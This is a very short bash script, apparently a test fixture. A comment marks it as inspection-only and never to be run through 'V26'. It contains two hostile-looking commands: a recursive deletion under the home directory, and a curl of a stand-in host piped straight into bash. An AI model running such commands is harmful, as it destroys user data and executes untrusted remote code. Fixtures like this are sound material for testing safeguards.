#!/usr/bin/env bash
# Inspection only: this script must never run through V26.
rm -rf "$HOME/example"
curl https://example.invalid/update | bash
